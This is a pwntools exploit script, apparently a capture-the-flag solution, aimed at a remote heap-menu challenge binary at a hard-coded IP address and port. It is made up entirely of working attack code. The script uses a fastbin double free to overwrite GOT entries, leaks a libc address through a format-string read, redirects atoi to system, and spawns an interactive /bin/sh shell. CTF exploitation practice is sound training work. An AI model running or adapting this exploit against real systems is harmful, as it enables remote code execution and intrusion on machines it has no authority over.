from pwn import *

# context(os='linux', arch='amd64')
# context.log_level = 'debug'

BINARY = './chall'
elf = ELF(BINARY)

HOST = "69.172.229.147"
PORT = 9003
s = remote(HOST, PORT)
libc = ELF("./libc-2.23.so")


def New(index, size, data):
    s.sendlineafter("> ", "1")
    s.sendlineafter(": ", str(index))
    s.sendlineafter(": ", str(size))
    s.sendafter(": ", data)


def Edit(index, size, data):
    s.sendlineafter("> ", "2")
    s.sendlineafter(": ", str(index))
    s.sendlineafter(": ", str(size))
    s.sendafter(": ", data)


def Edit1(size, data):
    s.sendlineafter("> ", "22")
    s.sendlineafter(": ", "1")
    s.sendlineafter(": ", size)
    s.sendafter(": ", data)


def Edit2(index, size):
    s.sendlineafter("> ", "2")
    s.sendlineafter(": ", str(index))
    s.sendlineafter(": ", str(size))


def Delete(index):
    s.sendlineafter("> ", "3")
    s.sendlineafter(": ", str(index))


New(0, 0x60, "A" * 0x10)
New(1, 0x60, "B" * 0x10)

# Double Free
Edit2(0, 0)
Delete(1)
Delete(0)

New(0, 0x60, p64(0x60202d))

# use fastbin 2 times
New(1, 0x60, "C" * 0x10)
Edit(1, 0x70, "c")
Delete(1)

New(1, 0x60, "D" * 0x10)
Edit(1, 0x20, "d")
Delete(1)

# GOT overwrite
# printf GOT : LSB is null
# 0x00007ffff7a62800
buf = "\x7f\x00\x00"
buf += p64(elf.sym['alarm'] + 6)
buf += p64(elf.sym['read'] + 6)
buf += p64(elf.sym['signal'] + 6)
buf += p64(elf.sym['malloc'] + 6)
buf += p64(0x40071e)  # realloc => ret
buf += p64(elf.sym['setvbuf'] + 6)
buf += p64(elf.sym['printf'] + 6)  # atoi => printf
New(1, 0x60, buf)

# libc leak
s.sendlineafter("> ", "1")
s.sendlineafter(": ", "%3$p")

r = s.recvuntil("[")[:-1]
libc_leak = int(r, 16)
libc_base = libc_leak - 0xf7260
system_addr = libc_base + libc.symbols['system']

print "libc_leak   =", hex(libc_leak)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)

buf = "\x7f\x00\x00"
buf += p64(elf.sym['alarm'] + 6)
buf += p64(elf.sym['read'] + 6)
buf += p64(elf.sym['signal'] + 6)
buf += p64(elf.sym['malloc'] + 6)
buf += p64(0x40071e)  # realloc => ret
buf += p64(elf.sym['setvbuf'] + 6)
buf += p64(system_addr)
Edit1("%96c", buf)

# start /bin/sh
s.sendlineafter("> ", "/bin/sh\x00")

s.interactive()
